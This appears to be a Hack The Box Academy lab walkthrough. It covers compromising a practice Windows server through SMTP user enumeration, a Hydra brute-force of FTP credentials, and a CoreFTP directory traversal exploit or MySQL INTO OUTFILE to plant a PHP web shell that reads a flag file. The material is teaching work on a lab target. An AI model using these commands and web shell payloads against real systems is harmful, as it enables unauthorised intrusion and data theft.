# 

---

We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format:

- `HTB{...}`

Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.

---
## Question 1

### "You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer."

After spawning the target machine, students need to launch an `Nmap` scan against it:

Code: shell

```shell
nmap -A STMIP
```

  Attacking Common Services - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ nmap -A 10.129.203.7

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 13:54 GMT
Nmap scan report for 10.129.203.7
Host is up (0.014s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     Command unknown, not supported or not allowed...
|     Command unknown, not supported or not allowed...
|   NULL: 
|_    220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|_ssl-date: 2022-11-27T13:56:03+00:00; 0s from scanner time.
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| http-title: Welcome to XAMPP
|_Requested resource was http://10.129.203.7/dashboard/
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
443/tcp  open  https         Core FTP HTTPS Server
| fingerprint-strings: 
|   LDAPSearchReq: 
|_    550 Too many connections, please try later...
|_ssl-date: 2022-11-27T13:56:03+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
|_http-server-header: Core FTP HTTPS Server
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 10
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSigpipes, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, ConnectWithDatabase, FoundRows, LongColumnFlag, Speaks41ProtocolNew, InteractiveClient, SupportsCompression, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: s`gc>J7s`gdB\'M.>,`#
|_  Auth Plugin Name: mysql_native_password
<SNIP>
```

With SMTP open, students need to enumerate users with `smtp-user-enum`, however first, [users.zip](https://academy.hackthebox.com/storage/resources/users.zip) must be downloaded and unzipped:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/resources/users.zip && unzip users.zip
```

  Attacking Common Services - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/resources/users.zip && unzip users.zip

--2022-11-27 14:08:13--  https://academy.hackthebox.com/storage/resources/users.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 434 [application/zip]
Saving to: ‘users.zip’

users.zip                                   100%[===========================================================================================>]     434  --.-KB/s    in 0s      

2022-11-27 14:08:13 (1.48 MB/s) - ‘users.zip’ saved [434/434]

Archive:  users.zip
  inflating: users.list
```

Subsequently, students need to use `smtp-user-enum`, setting the method to use for username guessing to be `RCPT`, the file of usernames to be checked to be `users.list`, and the domain to be `inlanefreight.htb`, finding the username `fiona`:

Code: shell

```shell
/usr/bin/smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t STMIP
```

  Attacking Common Services - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ /usr/bin/smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Sun Nov 27 14:11:34 2022 #########
10.129.203.7: fiona@inlanefreight.htb exists
######## Scan completed at Sun Nov 27 14:11:36 2022 #########
1 results.

79 queries in 2 seconds (39.5 queries / sec)
```

Then, students need to bruteforce the FTP password of the user `fiona` using either `Hydra` or `medusa`; `Hydra` will be used, most importantly, the number of threads is set to 1, otherwise students will get a 550 error:

Code: shell

```shell
hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://STMIP -u -t 1
```

  Attacking Common Services - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://10.129.3.107 -u -t 1

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-27 15:06:58
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking ftp://10.129.3.107:21/
[STATUS] 74.00 tries/min, 74 tries in 00:01h, 14344325 to do in 3230:43h, 1 active
[21][ftp] host: 10.129.3.107   login: fiona   password: 987654321
1 of 1 target successfully completed, 1 valid password found
```

With the found credentials `fiona:987654321`, students need to connect to the FTP server on the spawned target, providing `fiona` as the username and `987654321` as the password

Code: shell

```shell
ftp STMIP
```

  Attacking Common Services - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ ftp 10.129.203.7

Connected to 10.129.203.7.
220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
Name (10.129.203.7:root): fiona
331 password required for fiona
Password:
230-Logged on
230 
Remote system type is UNIX.
Using binary mode to transfer files.
```

When using `dir` to list the files available, students will find `docs.txt` and `WebServersInfo.txt`, thus, they need to `get` them:

Code: shell

```shell
get docs.txt
get WebServersInfo.txt
bye
```

  Attacking Common Services - Easy

```shell-session
ftp> get docs.txt

local: docs.txt remote: docs.txt
200 PORT command successful
150 RETR command started
226 Transfer Complete
55 bytes received in 0.00 secs (135.2920 kB/s)
ftp> get WebServersInfo.txt
local: WebServersInfo.txt remote: WebServersInfo.txt
200 PORT command successful
150 RETR command started
226 Transfer Complete
255 bytes received in 0.00 secs (747.8181 kB/s)
```

When checking out the contents of `WebServersInfo.txt`, students will notice that the spawned target uses `CoreFTP`, and that the `Apache` directory is at `C:\xampp\htdocs\`:

Code: shell

```shell
awk 1 WebServersInfo.txt
```

  Attacking Common Services - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ awk 1 WebServersInfo.txt

CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443
Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php
```

Armed with this info, students need to search for `CoreFTP` exploits using `searchsploit`:

Code: shell

```shell
searchsploit CoreFTP
```

  Attacking Common Services - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ searchsploit CoreFTP

---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CoreFTP 2.0 Build 674 MDTM - Directory Traversal (Metasploit)                                                                                 | windows/remote/48195.txt
CoreFTP 2.0 Build 674 SIZE - Directory Traversal (Metasploit)                                                                                 | windows/remote/48194.txt
CoreFTP 2.1 b1637 - Password field Universal Buffer Overflow                                                                                  | windows/local/11314.py
CoreFTP Server build 725 - Directory Traversal (Authenticated)                                                                                | windows/remote/50652.txt
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Since students have the credentials `fiona:987654321`, they need to mirror/copy the `windows/remote/50652.txt` exploit:

Code: shell

```shell
searchsploit -x windows/remote/50652.txt
```

  Attacking Common Services - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ searchsploit -m windows/remote/50652.txt

  Exploit: CoreFTP Server build 725 - Directory Traversal (Authenticated)
      URL: https://www.exploit-db.com/exploits/50652
     Path: /usr/share/exploitdb/exploits/windows/remote/50652.txt
File Type: ASCII text

Copied to: /home/htb-ac413848/50652.txt
```

After reading the text file, students will know that they can create files with `PUT` requests:

Code: shell

```shell
cat 50652.txt
```

  Attacking Common Services - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ cat 50652.txt 

# Exploit Title: CoreFTP Server build 725 - Directory Traversal (Authenticated)
# Date: 08/01/2022
# Exploit Author: LiamInfosec
# Vendor Homepage: http://coreftp.com/
# Version: build 725 and below
# Tested on: Windows 10
# CVE : CVE-2022-22836

# Description:

CoreFTP Server before 727 allows directory traversal (for file creation) by an authenticated attacker via ../ in an HTTP PUT request.

# Proof of Concept:

curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

Therefore, students need to write a PHP file that contains a web shell (students can generate a random name with the command `openssh rand -hex 16`) within the `--data-binary` option, utilizing the `Apache` directory `/xampp/htdocs` (since other directories might not be allowed):

Code: shell

```shell
curl -k -X PUT -H "Host: STMIP" --basic -u fiona:987654321 --data-binary '<?php echo shell_exec($_GET["c"]);?>' --path-as-is https://STMIP/../../../../../../xampp/htdocs/1af271ec0935f7ccbd31dc24666f7f33.php
```

  Attacking Common Services - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ curl -k -X PUT -H "Host: 10.129.242.84" --basic -u fiona:987654321 --data-binary '<?php echo shell_exec($_GET["c"]);?>' --path-as-is https://10.129.242.84/../../../../../../xampp/htdocs/1af271ec0935f7ccbd31dc24666f7f33.php

HTTP/1.1 200 Ok
Date:Sun, 27 Oct 2022 16:10:37 GMT
Server: Core FTP HTTP Server
Accept-Ranges: bytes
Connection: Keep-Alive
Content-type: application/octet-stream
Content-length: 36
```

At last, students need to print out the contents of the flag file "flag.txt", which is inside the directory `C:\Users\Administrator\Desktop\`, using the web shell (utilizing HTTP and not HTTPS):

Code: shell

```shell
curl -w "\n" http://STMIP/1af271ec0935f7ccbd31dc24666f7f33.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt
```

  Attacking Common Services - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ curl -w "\n" http://10.129.242.84/1af271ec0935f7ccbd31dc24666f7f33.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt

HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
```

The second method to solve this question differs in that the web shell is not written using the `CoreFTP` exploit but rather via `MySQL`. With the attained `fiona:987654321` credentials, students need to connect to `MySQL` server on the spawned target:

Code: shell

```shell
mysql -u fiona -p987654321 -h STMIP
```

  Attacking Common Services - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ mysql -u fiona -p987654321 -h 10.129.242.84

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 8
Server version: 10.4.24-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Subsequently, to check whether files can be read and written, students need to query for the value of the global variable `secure_file_priv`, finding it to be empty, therefore, files can be read and written:

Code: shell

```shell
show variables like "secure_file_priv";
```

  Attacking Common Services - Easy

```shell-session
MariaDB [(none)]> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0.016 sec)
```

Students need to write a PHP file that contains a web shell (students can generate a random name with the command `openssh rand -hex 16`) with the statement `SELECT ... INTO OUTFILE`, utilizing the `Apache` directory `/xampp/htdocs`:

Code: sql

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/90957b76a1f20de2b13c5bcb2d05b5cf.php';
```

  Attacking Common Services - Easy

```shell-session
MariaDB [(none)]> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/90957b76a1f20de2b13c5bcb2d05b5cf.php';

Query OK, 1 row affected (0.015 sec)
```

Then, students need to print out the contents of the flag file "flag.txt", which is inside the directory `C:\Users\Administrator\Desktop\`, using the web shell (utilizing HTTP and not HTTPS):

Code: shell

```shell
curl -w "\n" http://STMIP/90957b76a1f20de2b13c5bcb2d05b5cf.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt
```

  Attacking Common Services - Easy

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ curl -w "\n" http://10.129.242.84/90957b76a1f20de2b13c5bcb2d05b5cf.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt

HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
```

Answer: {hidden}